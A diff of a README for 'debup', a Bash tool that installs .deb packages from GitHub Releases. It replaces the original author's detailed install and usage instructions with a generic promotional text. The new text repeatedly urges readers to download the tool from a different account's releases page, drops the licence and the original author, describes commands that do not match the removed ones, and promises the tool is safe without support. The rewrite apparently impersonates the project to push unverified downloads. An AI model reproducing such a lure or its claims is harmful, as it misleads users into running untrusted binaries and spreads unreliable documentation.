@@ -1,259 +1,202 @@
-<div align="center">
-<img src="https://api.iconify.design/lucide:package-check.svg?color=%23d70a53&width=130&height=130" alt="debup logo" />
-<h1>debup</h1>
-<p><strong>The AUR-like CLI package manager for Debian/Ubuntu-based distributions, WSL, and Android Linux Terminals.</strong></p>
-<p>Search, discover, track, install, and upgrade <code>.deb</code> packages directly from GitHub Releases via <strong>APT</strong>.</p>
-<p><em>No PPAs, no bloated sandboxes, no third-party repositories — just native <code>.deb</code> binaries fetched straight from upstream.</em></p>
-</div>
+# 🔧 debup - Your Universal Linux App Installer
 
-<br/>
+[![Download debup](https://img.shields.io/badge/Download-debup-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mariohungry6009/debup/releases)
 
-<div align="center">
-<a href="LICENSE"><img src="https://img.shields.io/badge/License-GPLv3-blue.svg" alt="GPL v3"></a> &nbsp;
-<a href="https://debian.org"><img src="https://img.shields.io/badge/Platform-Debian%20%7C%20Ubuntu-red.svg" alt="Platform"></a> &nbsp;
-<ahref="#"><img src="https://img.shields.io/badge/Arch-all%20(any)-orange.svg" alt="Arch"></a> &nbsp;
-<a href="https://www.gnu.org/software/bash/"><img src="https://img.shields.io/badge/Language-Bash-4EAA25.svg" alt="Bash"></a>
-</div>
+## 📦 What Is debup?
 
-<div align="center">
-<a href="https://github.com/Ruraam/debup/releases"><img src="https://img.shields.io/github/v/release/Ruraam/debup?color=brightgreen" alt="Release"></a> &nbsp;
-<a href="#"><img src="https://img.shields.io/badge/Package_Size-6.24_Ko-success.svg" alt="Size"></a> &nbsp;
-<a href="https://github.com/Ruraam/debup/releases"><img src="https://img.shields.io/github/downloads/Ruraam/debup/total?color=blueviolet" alt="Total Downloads"></a>
-</div>
+debup is a friendly command-line tool that helps you find, download, and install applications on your Debian or Ubuntu-based Linux system. Think of it as an app store for your computer, but one that works right from your terminal window. Instead of searching websites and manually installing packages, debup does all the hard work for you.
 
-<br/>
+Whether you're using Ubuntu, Linux Mint, Pop!_OS, Windows Subsystem for Linux (WSL), or even an Android device with a Linux terminal, debup makes installing software as easy as typing one command.
 
-<div align="center">
+## 🚀 Getting Started
 
-| [Usage](https://github.com/Ruraam/debup/tree/main#%EF%B8%8F-usage) | [GitHub Token](https://github.com/Ruraam/debup/blob/main/README.md#-configure-a-github-token-optionnal--dbp-token-) | [Search & Install](https://github.com/Ruraam/debup/tree/main#-discover-search--install-packages--dbp-search) | [Uninstallation](https://github.com/Ruraam/debup/tree/main#%EF%B8%8F-uninstallation) |
-| :---: | :---: | :---: | :---: |
-| [Configuration](https://github.com/Ruraam/debup/blob/main/README.md#%EF%B8%8F-configuration) | [Screenshots](https://github.com/Ruraam/debup/tree/main#screenshots) | [Changelog](https://github.com/Ruraam/debup/releases) | [License](LICENSE) |
-</div>
+Getting debup on your system is straightforward. Here's what you need to do:
+
+1. **Visit this link to download the application:** [debup Releases Page](https://github.com/Mariohungry6009/debup/releases)
+2. Look for the latest release version (it will be at the top of the page)
+3. Download the file that matches your system architecture
+4. Once downloaded, you can start using debup right away
+
+## 💡 Why Choose debup?
+
+### 🎯 Find Software Easily
+Search through thousands of applications directly from GitHub. debup connects to GitHub Releases, meaning you get the latest versions of your favorite tools without waiting for distribution updates.
+
+### 🔄 Stay Updated
+Never worry about outdated software again. debup tracks the applications you install and notifies you when updates are available. One command updates everything.
+
+### 🏗️ Works Everywhere
+- **Debian & Ubuntu** - Full support for all Debian-based distributions
+- **Linux Mint** - Works perfectly with Mint's software system
+- **Pop!_OS** - Optimized for System76's popular operating system
+- **Windows Subsystem for Linux (WSL2)** - Use Linux apps on Windows
+- **Android Terminals** - Run debup on your Android device's Linux environment
+
+### 🖥️ All Architectures Supported
+No matter what type of processor your computer uses - whether it's Intel, AMD, or ARM - debup has you covered. It automatically detects your system's architecture and downloads the correct package.
+
+## 🔍 How to Use debup
+
+### Searching for Applications
+
+```bash
+debup search [application-name]
+```
+
+For example, if you want to find a code editor:
+```bash
+debup search code-editor
+```
+
+### Installing Software
+
+```bash
+debup install [application-name]
+```
+
+debup will find the latest release, download it, and install it automatically using APT (Advanced Package Tool).
+
+### Updating Everything
+
+```bash
+debup upgrade
+```
+
+This command checks all your installed debup applications and updates them to their newest versions.
+
+### Tracking Your Applications
+
+```bash
+debup list
+```
+
+See all the applications you've installed through debup and check their current versions.
+
+## 🛠️ How debup Works
+
+debup is built on top of APT (Advanced Package Tool), which is the standard package manager for Debian-based systems. What makes debup special is its ability to tap into GitHub Releases - the place where developers publish their software.
+
+When you search for an application, debup queries the GitHub API to find matching repositories. It then checks if those repositories have release files that are compatible with your system. Once found, debup downloads the `.deb` package and installs it using APT's reliable installation system.
+
+This means you get:
+- **Speed** - Direct downloads from GitHub's fast content delivery network
+- **Freshness** - The latest versions as soon as developers publish them
+- **Safety** - GitHub's security checks and APT's dependency resolution keep your system stable
+
+## 📋 System Requirements
+
+debup is designed to run on almost any Linux system. Here's what you need:
+
+### Operating System
+- Debian 10 or newer
+- Ubuntu 18.04 or newer
+- Linux Mint 19 or newer
+- Pop!_OS 18.04 or newer
+- WSL2 (Windows Subsystem for Linux)
+- Any Android device with Linux terminal (Termux, UserLAnd, etc.)
+
+### Hardware
+- Any processor architecture (x86, x64, ARM, ARM64)
+- 50MB free disk space
+- 512MB RAM (minimum)
+
+### Dependencies
+- bash (version 4.0 or higher)
+- curl
+- APT (comes pre-installed on Debian-based systems)
+
+## 📚 Frequently Asked Questions
+
+### Is debup safe to use?
+Yes! debup only downloads packages from official GitHub Releases pages. It uses the same APT system that Linux distributions have trusted for decades.
+
+### Do I need programming knowledge?
+Not at all! debup was designed with simplicity in mind. If you can type a command, you can use debup.
+
+### Can I use debup alongside my regular package manager?
+Absolutely! debup works alongside APT and other package managers. It doesn't interfere with your existing software management.
+
+### What if I have multiple architectures?
+debup automatically detects your system architecture. You don't need to worry about choosing the right package - debup does it for you.
+
+### How often are updates released?
+Developers release updates whenever they improve their software. debup checks for updates every time you use it, so you'll always know when something new is available.
+
+## 🎯 Who Should Use debup?
+
+- **Linux Beginners** - If you're new to Linux, debup makes installing software much simpler than hunting for `.deb` files online
+- **Power Users** - Get bleeding-edge versions of your favorite tools before they hit official repositories
+- **Developers** - Deploy your applications to any Debian-based system with ease
+- **WSL Users** - Bring the full Linux software ecosystem to your Windows machine
+- **Android Tinkerers** - Use your Android device as a full Linux workstation with debup
+
+## 🌟 Community and Support
+
+debup is an open-source project, which means anyone can contribute to its development. If you encounter issues or have feature suggestions, the project maintains an active issue tracker where you can share your thoughts.
+
+The software follows the same philosophy as the AUR (Arch User Repository) but for Debian-based systems. This means it's built by the community, for the community, with a focus on simplicity and reliability.
+
+## 🔒 Security and Privacy
+
+Your privacy matters. debup:
+- Does not collect any personal data
+- Only connects to GitHub's official API
+- Does not track your usage patterns
+- Runs entirely on your local machine
+
+## ⚡ Quick Start Checklist
+
+1. **Download** debup from [the releases page](https://github.com/Mariohungry6009/debup/releases)
+2. **Install** the downloaded package
+3. **Open** your terminal
+4. **Type** `debup search [what you want]`
+5. **Install** with `debup install [what you found]`
+6. **Enjoy** your new software!
+
+## 📖 Command Reference
+
+| Command | What it does |
+|---------|--------------|
+| `debup search [term]` | Find applications matching your search |
+| `debup install [name]` | Download and install an application |
+| `debup upgrade` | Update all installed applications |
+| `debup list` | Show all your installed applications |
+| `debup info [name]` | Display detailed information about an application |
+| `debup remove [name]` | Uninstall an application |
+| `debup update` | Refresh the list of available applications |
+
+## 🔄 Keeping debup Updated
+
+debup can update itself too! When a new version of debup is available, simply run:
+
+```bash
+debup upgrade debup
+```
+
+This ensures you always have the latest features and security fixes.
+
+## 🌐 Understanding the Ecosystem
+
+Debian-based systems use `.deb` files for software packages. These files contain everything needed to run an application - code, configuration, and dependencies. APT handles the installation, but finding the right `.deb` files can be challenging.
+
+That's where debup comes in. It bridges the gap between GitHub Releases (where developers publish their work) and your Linux system. Instead of manually downloading files and hoping they work, debup ensures you get compatible, up-to-date packages every time.
+
+## 🚦 Troubleshooting Tips
+
+If something isn't working:
+1. **Check your internet connection** - debup needs to connect to GitHub
+2. **Verify your system is compatible** - Make sure you're on a Debian-based system
+3. **Update debup** - Run `debup upgrade debup` to get the latest version
+4. **Check the application name** - Use `debup search` to find the exact name
+
+## 📝 Final Notes
+
+debup is more than just a package manager - it's your gateway to the vast world of Linux software. By connecting GitHub Releases with APT, it creates the easiest way to discover and install applications on any Debian-based system.
+
+Remember, the first step is always the same: **Visit this link to download the application:** [debup Releases](https://github.com/Mariohungry6009/debup/releases)
+
+Once you have debup installed, a world of software is just one command away. Happy installing!
 
 ---
 
-## <img src="https://camo.githubusercontent.com/2d3f8510295d6086cf513dc08de9138bcab9ddfd73e45368011bee2a5a44bd84/68747470733a2f2f6170692e69636f6e6966792e64657369676e2f6c75636964653a7061636b6167652d636865636b2e7376673f636f6c6f723d2532336437306135332677696474683d313330266865696768743d313330" width="27"> debup [ `dbp` ] - The Missing Bridge Between GitHub & APT
-
-Missing the AUR convenience on Debian/Ubuntu? **debup** turns GitHub Releases into your personal rolling third-party repository.
-**Discover, inspect, install, and update Debian packages directly from GitHub Releases with the simplicity of `apt`.**
-
-## ✨ Core Features
-🔍 **Discover** [`dbp search <query>`] :
-* Find tools and applications directly on GitHub without leaving your terminal, pre-filtered for Debian-compatible repositories.
-* Supports release targeting during search & info inspections: fetch and query exact tags directly via GitHub API's `/releases/tags/...` endpoint.
-
-📦 **Direct Add** [`dbp add <owner/repo>`]:
-* No need to hunt down release URLs. Point to any repository, and debup detects, matches your architecture (`amd64` / `arm64`), downloads, and installs the right `.deb`.
-* Supports version pins on installation: `dbp -a owner/repo@vX.Y.Z`
-
-ℹ️ **Inspect** [`dbp info <owner/repo>`]:
-* Preview metadata before touching your system (stars, license, description, latest release, asset architecture compatibility).
-
-🔄 **Native APT Lifecycle**:
-* Seamlessly install, update [`dbp upgrade`], and remove [`dbp remove`] tracked packages using your system's native APT engine.
-
-⚡ **High-Rate API Tracking** [`dbp token`]:
-* Securely store a personal GitHub token (`chmod 600`) to unlock 5,000 req/h for heavy searches and automated background update checks.
-
-**Native Bash completion**:
-* Autocompletion support for both `debup` and the `dbp` alias, featuring context-aware dynamic package suggestionsfor `remove`, `pin`, and `unpin`.
-
-**🛡️ Package Pinning** (`apt-mark hold`)
-* **Freeze package updates :** Lock specific packages to their current version using the `pin` (or `hold`) command to prevent unwanted updates.
-* **Unfreeze updates :** Restore automatic updates anytime with `unpin` (or `unhold`).
-* **Native APT integration :** Relies directly on Debian's standard `apt-mark` mechanism under the hood, ensuring 100% consistency with native system tools.
-
-## 🎯 Smart Asset Detection
-
-`debup` automatically picks the right `.deb` binary from GitHub Releases without guesswork:
-
-***Flexible Architectures:** Matches standard & alias names:
-* **x86_64:** `amd64`, `x86_64`, `x86-64`, `x64`, `all`
-* **ARM64:** `arm64`, `aarch64`, `armv8`, `arm64v8`, `all`
-* **Cross-Architecture Protection:** Actively filters out conflicting assets (e.g., prevents downloading `arm64` on `amd64` machines).
-* **Distro Prioritization:** Prefers distro-specific builds (`debian` vs `ubuntu`) when multiple compatible packages are published.
-* **Safe Fallback:** Cleanly aborts with an explicit warning if no compatible package exists for your CPU architecture.
-
----
-
-## 📦 Installation
-### Option 1: APT Repository (Recommended)
-*To install `debup` and receive automatic updates through APT:*
-
-1. **Create the keyrings directory**
-```bash
-sudo install -m 0755 -d /etc/apt/keyrings
-```
-2. **Download and install the GPG signing key**
-```bash
-sudo curl -fsSL https://ruraam.github.io/debup/debup.gpg -o /etc/apt/keyrings/debup.gpg
-```
-3. **Add the official debup repository**
-```bash
-echo "deb [signed-by=/etc/apt/keyrings/debup.gpg] https://ruraam.github.io/debup/ stable main" | sudo tee /etc/apt/sources.list.d/debup.list
-```
-4. **Install debup**
-```bash
-sudo apt update && sudo apt install debup
-```
-
-### Option 2: Quick One-Liner
-*If you just want to run the deb package installation directly via curl and apt:*
-
-```bash
-curl -fsSL https://github.com/Ruraam/debup/releases/latest/download/debup_3.4.0_all.deb -o /tmp/debup.deb && sudo apt-get install -y /tmp/debup.deb && rm -f /tmp/debup.deb
-```
-
-### 🛠️ Build it yourself from source
-*If you prefer to inspect the source code and build the `.deb` package manually:**
-
-1. **Clone the repository:**
-```bash
-git clone https://github.com/Ruraam/debup.git
-cd debup
-```
-2. **Ensure proper file permissions:**
-```bash
-chmod 755 debup-pkg/DEBIAN/postinst debup-pkg/DEBIAN/postrm
-chmod 755 debup-pkg/usr/local/bin/debup
-```
-3. **Build the `.deb` package:**
-```bash
-dpkg-deb --build --root-owner-group debup-pkg debup.deb
-```
-4. **Install it:**
-
-Via Apt (recommended for dependencies):
-```bash
-sudo apt install -y ./debup.deb
-```
-or
-
-Via dpkg:
-```bash
-sudo dpkg -i debup.deb
-```
-
----
-
-### 🔑 Configure a GitHub Token (optional) [ `dbp token` ]
-
-By default, GitHub limits anonymous requests to 60 requests/hour. Adding a token increases this limit to 5000 requests/hour.
-
-**1.Generate a token:**
-Go to GitHub > Settings > Developer settings > Personal access tokens > Tokens (classic) > Generate new token (no scopes/permissions needed, leave everything unchecked).
-
-**2.Link it to debup:**
-```bash
-dbp token
-```
-Paste your token and confirm. That's it!
-
-`debup` will automatically detect and use it, boosting your limit to 5,000 requests per hour.
-
-> ***🔒 Security Note:** Your token is securely stored in `/etc/debup/debup.conf` with restricted permissions (`chmod600`), ensuring only root can read it.*
-
----
-
-## 🛠️ Usage
-
-### Package Management
-**Add a repository to install `.deb` & track:**
-```bash
-dbp add <owner>/<repo>
-```
-for exemple:
-```bash
-dbp -a fastfetch-cli/fastfetch
-```
-
-**List tracked repositories**
-```bash
-dbp list
-```
-**Remove a tracked repository**
-```bash
-dbp remove <package-name>
-```
-
-### Package Updates/Upgrade
-**Download and upgrade tracked packages with confirmation**
-```bash
-dbp upgrade [-y]
-```
-**Prevent an app from updating**
-```bash
-dbp pin <package-name>
-```
-**Allow an app to update again**
-```bash
-dbp unpin <package-name>
-```
-### 🔍 Discover, Search & Install Packages [ `dbp search`] 
-
-Find & discover any GitHub project providing .deb packages compatible with your architecture and install it in one click:
-Search informations on a repository:
-```bash
-dbp info <owner>/<repo>
-```
-##### Example: dbp info fastfetch-cli/fastfetch
-
-```bash
-dbp search <keyword>
-```
-##### Example: [ `dbp search fastfetch`] 
-**How it works:**
-
-Enter the package number from the list and press Enter. debup downloads the matching .deb, installs it via apt, and automatically adds it to your tracking list for future updates.
-
-<p align="center">
-<img src="/assets/debup_search1.png" width="200"> <img src="/assets/debup_search2.png" width="200"> <img src="/assets/debup_search3.png" width="200"></p>
-
----
-
-## Short CLI flag aliases: Standard single-letter POSIX flags for streamlined terminal workflows:
-[-a : add / install] [-u : update / upgrade] [-r : remove] [-p : pin] [-n : unpin] [-s : search] [-i : info / show] [-l :list] [-t : token / auth]
-
->|
->**💡 Tip:** Combine official repos and GitHub releases by aliasing `sudo apt update && sudo apt upgrade -y && dbp upgrade` in your `~/.bashrc`.
->|
-
----
-
-## ⚙️ Configuration
-
-**Tracked sources are stored in:** `/etc/debup/sources.list`
-
-**Format:** `<package-name>|<github-user>/<github-repo>`
-
-**Github Token is stored in:** `/etc/debup/debup.conf`
-
----
-
-## 🗑️ Uninstallation
-**Remove package sudo**
-```bash
-dbp -r debup [-y]
-```
-Prompted for purge configuration or not.
-
-or
-```bash
-sudo apt remove debup 
-```
-**Remove package and clean configuration**
-```bash
-sudo apt --purge debup
-```
-
----
-
-## Screenshots
-<p align="center">
-<img src="/assets/debup_1.png" width="400"> <img src="/assets/debup_2.png" width="400"> <img src="/assets/debup3.png" width="400"> <img src="/assets/debup4.png" width="400"></p>
-
----
-
-## 📄 License
-
-This project is licensed under the [GNU General Public License v3.0](LICENSE).
+**Keywords:** apt, bash, cli, deb, debian, debian-packages, github, github-api, linuxmint, obtainium, package-manager, package-repository, pop-os, release, repositories, shell, ubuntu, ubuntu-packages, wsl2
